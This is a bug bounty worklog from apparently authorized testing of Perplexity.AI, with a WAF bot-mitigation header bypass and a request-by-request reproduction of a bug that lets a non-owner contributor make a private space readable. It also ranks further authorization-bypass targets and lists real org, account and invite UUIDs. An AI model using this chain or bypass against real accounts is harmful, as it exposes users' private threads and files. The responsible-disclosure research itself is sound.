# Perplexity.AI Bug Bounty — Recon Worklog (zeno0)
Target: Perplexity.AI Managed Bug Bounty (Bugcrowd, private) — zeno0 / zeno0@bugcrowdninja.com

## Session 1 — 2026-10-17 (UTC+8)

### 1. Cloudflare / Edge Analysis
- www.perplexity.ai HTML pages: CF managed challenge (headless browser blocked)
- Static assets OPEN: /_next/static/*, /service-worker.js (200), /manifest.json, /robots.txt, /sitemap.xml, /favicon.ico, /cdn-cgi/trace
- api.perplexity.ai: NO CF challenge at all (FastAPI backend)
- docs.perplexity.ai: open (Mintlify)
- **WAF allowlist key: `Sec-Fetch-Dest: empty` + `Sec-Fetch-Mode: cors` + `Sec-Fetch-Site: same-origin` headers → full /rest/* access** (bot mitigation only; not a security boundary)
- Python urllib TLS gets challenged; curl passes → use curl-backed tooling
- Source maps at pplx-static-sourcemaps.perplexity.ai → CF Access protected (locked)
- console-testing.i.perplexity.ai, staging.perplexity.ai, testing.perplexity.ai → CF Access locked
- omni-insights.perplexity.ai → own login page
- ppl-ai-public.s3.amazonaws.com → public S3 bucket (referenced in JS)

### 2. Assets
- SPA chunk inventory: 1948 JS assets @ pplx-next-static-public.perplexity.ai/_spa/assets/ (all downloaded, 21.2MB)
- 766 distinct /rest/* endpoints extracted (rest_endpoints_full.txt)
- 705 template-literal API calls extracted (method+path)
- Full UI route map incl. enterprise admin: /account/org/* (identity, encryption, roles-permissions, credentials-vault, connectors, enterprise-apis, comet-telemetry)
- docs.perplexity.ai: 163 pages; api.perplexity.ai v1 API inventory extracted

### 3. Accounts / Orgs
- zeno0 (plain): ADMIN of org A "hacking" 54120d9e-a400-41bb-97aa-e86b25a5a050 (org_user_uuid fa908814-31fc-421b-bc8b-4220dcaf91ae)
- zeno0+org: ADMIN of org B "victim" 0f134007-c939-42f0-a9b6-cc01128e8b8c (org_user_uuid 237b2325-4d07-4120-a3a5-faf402d04d22)
- Org B open_invite_link_uuid: 400fdd41-d3d4-466c-907e-9d317ecc6254
- Session tokens are NOT IP-bound (work cross-IP) — NextAuth JWE (dir+A256GCM)

### 4. Findings so far (NO bug yet — all properly enforced)
- x-pplx-account header: validated against session (401 on mismatch) — secure
- Cross-org on /rest/organizations/{org_id}/* : 403 USER_NOT_IN_ORG everywhere — secure
- Cross-org on /rest/enterprise/organization/{org_uuid}/* : 403 USER_NOT_IN_ORG / USER_IS_NOT_ADMIN — secure
- OAuth DCR on api.perplexity.ai: OPEN dynamic client registration (201) → consent screen required (no auto-consent found). access-control-allow-origin: * on /oauth/authorize (info)
- Unauth /rest/enterprise/*: empty data, correct scoping

### 5. Key endpoint inventory (top targets)
Enterprise v2 org API (NEW namespace):
- GET/POST/PATCH/DELETE /rest/organizations/{organization_id}/roles[/...], groups[/...], permissions[/...], credit-limits[/...]
- GET /rest/organizations/{organization_id}/permissions/{user_id}/effective
- GET /rest/organizations/{organization_id}/roles/{role_id}/computer-effort-policy (PATCH)
Enterprise legacy:
- /rest/enterprise/organization/{org_uuid}/user/{org_user_uuid}/make-admin|make-member|remove-preview
- /rest/enterprise/organization/encryption/root-keys (BYOK!)
- /rest/enterprise/comet/policy (+regenerate-token), jit-provisioning, force-sso, sso/enable
Sharing:
- /rest/thread/share, update_thread_access, {thread_uuid}/members, invite_group_to_thread
- /rest/collections/{uuid}/access, update_contributor_permission, remove_user, join-requests
- /rest/automations/{id}/sharing/members|groups
- /rest/assets/{asset_id}/access|members|share|invite-group|published-share (Perplexity Pages)
- /rest/connector-service/connectors/{source_id}/tools/{tool_name}/execute
Computer:
- /rest/computer/tasks/{task_id}/display/{session,status,control/acquire,webrtc/offer}
Files:
- /rest/file-repository/{download,delete-files}, /rest/collections/{uuid}/project_files/*
Billing:
- /rest/organizations/{org_id}/credit-limits/*, /rest/billing/credits/*

### 6. Testing status
- [x] Edge/WAF mapping
- [x] x-pplx-account header trust — SECURE
- [x] Cross-org v2 API — SECURE (403 everywhere)
- [ ] Sharing surfaces (threads/collections/spaces/automations/assets)
- [ ] Computer tasks IDOR
- [ ] Files/attachments IDOR
- [ ] Connector tool execution authz
- [ ] Billing/credit-limits authz

---

## FINDING #1 (CONFIRMED, end-to-end) — 2026-10-17
### Space/Project: WRITER contributor can flip general access to PUBLIC_READ (broken access control)
- Endpoint: `PUT /rest/collections/{collection_uuid}/access`
- Body: `{"updated_access": 4}` (4 = PUBLIC_READ; 1 = RESTRICTED/private)
- Preconditions: attacker is a contributor with `user_permission = 2` (WRITER) on the victim's PRIVATE space
- Verified chain:
  1. Owner (zeno0) owns private Space (access=1)
  2. Owner shares with attacker (zeno0+org) via `POST /rest/collections/share` {"collection_uuid":..., "targets":[{"type":"email","email":...}]}
  3. Attacker accepts (`POST /rest/collections/respond_to_invitation/{uuid}` {"accept":true})
  4. Attacker (permission=2 WRITER, NOT owner) → `PUT /rest/collections/{uuid}/access` {"updated_access":4} → 200, access becomes 4
  5. **Anonymous (no cookies) can now read the space + threads**: GET /rest/collections/get_collection?collection_uuid=...&collection_slug=... → 200 full data; GET /rest/collections/list_collection_threads → 200 thread list
- Authorization inconsistency proves the bug: READER (permission=1) → GENERIC_FAILED (blocked); OWNER-only operation succeeds for WRITER(2)
- Self permission escalation properly blocked (only READER/WRITER self-allowed, owner change forbidden)
- remove_user, update_contributor_permission on others: properly 403 as WRITER
- Thread variant (`POST /rest/thread/update_thread_access`): properly blocked ("CONTEXT NOT WRITABLE" without write token) — threads are hardened; spaces are not
- Program relevance: "Modification of Enterprise Spaces or user content without proper authorization" + "Collaborative Enterprise Spaces" + Broken Access Control
- NOTE: org-space (Enterprise Space) variant not yet verified — need a non-admin member account in an Enterprise org (both test accounts are ADMIN). User should verify via Burp with a MEMBER-role account.
- All state restored to private (access=1) after tests.

### Test-account permission enum (reverse-engineered)
- collection user_permission: 1=READER, 2=WRITER, 4=OWNER (3=invalid in update; possibly EDITOR legacy)
- general access: 1=RESTRICTED(private), 2=ORG_READ?, 3=ORG_WRITE?, 4=PUBLIC_READ (2,3 clamped server-side for non-admin flips; 4 accepted from WRITER — the bug)

## Recon continuation notes (session 1)
- GraphQL HTTP endpoint returns FORBIDDEN for everything incl __typename (WS-only; WS handshake 403 from non-browser TLS — user must test `wss://www.perplexity.ai/rest/perplexity_ask/graphql/ws?account=<uuid>` account-param trust in browser/Burp)
- api.perplexity.ai OAuth: DCR open (client registered 201). Consent screen enforced. Test redirect_uri validation tricks in Burp.
- Edge WAF bypass for /rest/*: Sec-Fetch-Dest/Mode/Site trio (any non-browser client). Bot mitigation only.

## SESSION 1 FINAL STATE
### Test harness (reusable)
- /scripts/pplx_session.py — curl-backed session helper (passes WAF; use which=plain|org)
- WAF recipe: UA + Sec-Fetch-Dest:empty + Sec-Fetch-Mode:cors + Sec-Fetch-Site:same-origin + session cookie
- Cookies: /scripts/cookie_plain.txt (zeno0), /scripts/cookie_org.txt (zeno0+org)

### Surfaces verified SECURE (do not re-test)
- /rest/organizations/{org_id}/* cross-org (403 USER_NOT_IN_ORG)
- /rest/enterprise/organization/{org_uuid}/* cross-org (403)
- x-pplx-account header session binding (401 mismatch)
- Collection: get_collection/view enforcement, update_contributor_permission (only READER/WRITER self), remove_user as WRITER (403)
- Threads: update_thread_access requires write token (CONTEXT NOT WRITABLE)
- Enterprise invite cross-org (400 USER_NOT_IN_ORGANIZATION)
- OAuth authorize: consent screen enforced (no auto-consent)

### CONFIRMED BUG #1 (P3-class on personal spaces; verify enterprise variant)
Space WRITOR-level contributor flips private space to PUBLIC_READ → anonymous read verified end-to-end.
PUT /rest/collections/{uuid}/access {"updated_access":4} as permission=2 (WRITER, non-owner) → 200.
READER(1) blocked, OWNER(4) intended. Enforcement gap at WRITER level. Restored after test.

### PRIORITY TARGETS FOR BURP TESTING (ranked)
1. ENTERPRISE SPACES variant of Bug #1: need MEMBER-role account in enterprise org → PUT /rest/collections/{uuid}/access with {"updated_access":2|3|4} as WRITER on an ORG space. If org space → public = P2.
2. GraphQL WS: wss://www.perplexity.ai/rest/perplexity_ask/graphql/ws?account=<other-account-uuid> — test account-param trust in browser (HTTP variant denies all; WS needs browser CF cookies)
3. Connector-service execution authz: POST /rest/connector-service/connectors/{source_id}/tools/{tool_name}/execute — cross-source/cross-user tool execution (enterprise connectors = program focus)
4. Automations sharing: create automation (POST /rest/automations), share to member, test IDOR on /rest/automations/{id}/runs + run-now as shared READER
5. OAuth DCR redirect_uri validation: api.perplexity.ai/oauth/register with https-variant/localhost/custom-scheme redirect_uris → then /oauth/authorize
6. Computer tasks: POST /rest/computer/tasks/{task_id}/display/session + control/acquire with x-desktop-viewer-session header — cross-account task VM access (needs active task)
7. Files IDOR: upload file (POST /rest/uploads/create_upload_url {content_type, file_size}), then /rest/collections/{other-uuid}/project_files/download_url + /rest/file-repository/download
8. SSO setup portal token: POST /rest/enterprise/organization/sso/generate-sso-setup-portal-link → portal_link apiToken — check expiry/scope/entropy (admin-intended, verify reuse/expiry)
9. Assets (Perplexity Pages): create asset, test /rest/assets/{id}/access + published-share flow as contributor
10. /rest/spaces/{space_uuid}/ms-teams-bindings/bind + confirm — cross-space binding authz

### Infrastructure discoveries
- enterprise-setup.perplexity.ai (SSO setup portal; /init?apiToken=... — live)
- pplx-next-static-public.perplexity.ai (open static host, 1948 assets)
- pplx-static-sourcemaps.perplexity.ai (CF Access locked)
- console-testing.i.perplexity.ai, staging.perplexity.ai, testing.perplexity.ai (CF Access locked)
- omni-insights.perplexity.ai (own login)
- ppl-ai-public.s3.amazonaws.com (public bucket ref)
- r2cdn.perplexity.ai (R2 file CDN)
- api.perplexity.ai OAuth AS: DCR open, consent enforced, CIMD supported, PKCE S256 only
- GraphQL: HTTP /rest/perplexity_ask/graphql denies all (WS-only), WS has ?account= param
# SESSION 2 — 2026-10-17 (UTC+8, continued same day)

## Recon COMPLETED (Super Z terminal)
- Full SPA chunk corpus: 1949/2077 assets downloaded from pplx-next-static-public
  (129 = stale refs 404). Source: www.perplexity.ai/service-worker.js (343KB, WAF-allowed).
- 811 unique API endpoints extracted (api-paths.json, endpoint-inventory.txt).
- Keyword feature map: sso 372 | connector 325 | role 265 | file 228 | space 199 |
  billing 160 | admin 78 | scim 11 | export 10 (keyword-map.json).
- Infra: edge.perplexity.ai (issues pplx.edge-vid/sid), frontend-cdn (serves _next),
  r2cdn, trust, console.perplexity.ai, suggest WS; staging/testing = CF Access (untouched).
- api.perplexity.ai openapi spec pulled (19 paths): /v1/skills/{id}/download,
  /v1/agent/{id}/files/{file_id}/content, /v1|v2/analytics/computer/usage (per-member).
- Sourcemaps (pplx-static-sourcemaps, 1879 chunk refs) = CF Access locked. No finding.
- docs.perplexity.ai: llms.txt + openapi.json archived locally.

## Test harness (Session 2, current)
- scripts/pplx_session.py which=red|org|plain path=... [method=] [body=] [raw=yes]
- WAF recipe: UA + Sec-Fetch-Dest:empty + Sec-Fetch-Mode:cors + Sec-Fetch-Site:same-origin.
  NOTE: plain/org cookie files were header-format → converted to Netscape (fix_cookies.py).
  LESSON: unauthenticated calls can return app-style 403 {"detail":"Forbidden"} — always
  verify session identity (GET /api/user) before interpreting 403s.
- Sessions all VALID: plain=zeno0(ADMIN orgA 54120d9e, owner), org=zeno0+org(ADMIN orgB
  0f134007), red=zeno0+test(MEMBER orgA, org_user_uuid 5670b028-1942-43c3-ab2b-cbf7555f56f1).
- Org A "hacking" roster: ADMIN fa908814(zeno0); MEMBERs 1d34c649(kroushuchiha),
  47df07ea(xgoon+admin), 84ca6ecc(ymym), 5670b028(zeno0+test). 5 seats, SELF_SERVE, WorkOS.
- Permission enum (spa-metadata chunk): NONE=0 READER=1 WRITER=2 OWNER=4 EDITOR=5
  OWNER_DEFAULT_BOOKMARKS=6 INVITED_READER=11 INVITED_WRITER=12.

## RE-TEST #1 on current build — CONFIRMED + EXPANDED
Personal space "test" (1276cc5a-85a0-444c-b001-3354a3dfdc8a, owner zeno052s=plain):
1. [red READER] self-escalate POST update_contributor_permission {email,permission:2} → 403 (blocked ✓)
2. [red READER] PUT access {"updated_access":4} → failed GENERIC_FAILED (blocked ✓)
3. [plain owner] grant WRITER via same endpoint → 200, red user_permission=2
4. [red WRITER non-owner] PUT access {"updated_access":4} → 200 completed, access=4  ← BUG
5. External unrelated account [org, not in orgA, not contributor]:
   - GET get_collection → 200 FULL space metadata
   - GET list_collection_threads → 200 thread list (uuids, modes, timestamps)
   - GET /rest/collections/{uuid}/project_files/tree → 200 FILE TREE
   - GET /rest/thread/{thread_uuid} → 200 FULL THREAD CONTENT  ← impact beyond session 1
   - Anonymous curl: VIEW_COLLECTION_NOT_ALLOWED (anon gated; any-authenticated-user reads)
6. Restored: access=1, red back to READER(1). ✓

## NEW FINDING #2 — Enterprise Space variant (unauthorized modification, in-scope)
Org A policy: public_collection_sharing_allowed=false.
1. [plain ADMIN] POST create_collection {"title","description","access":1,"organization_uuid":
   54120d9e-...} → org space 39f3f219-f56f-46eb-a60e-6833526e0072 created (access=1, org-owned).
2. [plain] POST /rest/collections/share {collection_uuid, targets:[{type:email,...}]} → shared;
   red became WRITER(2) directly (share to org member = instant, no accept step).
3. [red MEMBER+WRITER, non-owner] PUT access {"updated_access":4} → **200 completed, access=4**
   ← Member modified Enterprise Space general access DESPITE org policy forbidding public
   sharing. State persisted (owner view confirms access=4).
4. View gate: external+anon reads blocked on org space (unlike personal) → inconsistent state:
   UI shows public, view layer restricts. Still = unauthorized modification of Enterprise
   Space settings by non-admin member (program in-scope: "Modification of Enterprise Spaces
   or user content without proper authorization").
5. Restored access=1 then DELETED test org space. ✓

## Reporting posture (draft)
- Finding A (personal spaces): WRITER→public flip + any-authenticated-user read of space,
  threads, thread content, file tree. Repro'd on current build. Suggest: Broken Access
  Control / P2-class under www.perplexity.ai scope.
- Finding B (org spaces): member-level unauthorized general-access modification despite org
  policy + inconsistent enforcement state. In-scope "Enterprise Spaces modification".
  Impact magnitude lower (view-gated) — pair with Finding A as same root cause.
- Root cause: PUT /rest/collections/{uuid}/access lacks owner-only check for WRITER
  contributors; org-policy gate applied at VIEW layer only, not at WRITE layer.

## NEXT TARGETS (unchanged priority, now all terminal-driven)
1. ~~Enterprise space variant~~ DONE (Finding B)
2. GraphQL WS ?account= trust (needs browser WS - user)
3. Connector tool execute authz: POST /rest/connector-service/connectors/{sid}/tools/{t}/execute
4. Automations sharing IDOR (runs + run-now as READER)
5. OAuth DCR redirect_uri validation (api.perplexity.ai)
6. Computer tasks session/control cross-account
7. Files IDOR: uploads/create_upload_url + project_files/download_url
8. SSO setup portal link token scope/expiry
9. Assets/Pages contributor flows
10. ms-teams/slack space bindings bind+confirm authz
